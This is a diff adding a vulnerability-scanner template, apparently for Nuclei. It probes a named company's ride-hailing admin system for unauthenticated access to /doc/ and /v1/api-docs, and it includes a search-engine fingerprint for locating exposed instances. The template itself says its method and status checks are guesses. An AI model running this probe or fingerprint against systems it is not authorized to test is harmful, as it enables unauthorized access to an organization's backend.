@@ -1,0 +1,32 @@
+id: poc-4c03f7145c1ddc7ba646
+info:
+  name: 江西云本数字科技有限公司云出行后台管理系统未授权访问漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/4c03f7145c1ddc7ba646f0a331fc2127
+
+    [!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: unauth,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 4c03f7145c1ddc7ba646f0a331fc2127
+    fofa: + hunter`web.body="云出行后台管理系统"`
+http:
+- raw:
+  - 'GET /doc/ HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /v1/api-docs HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
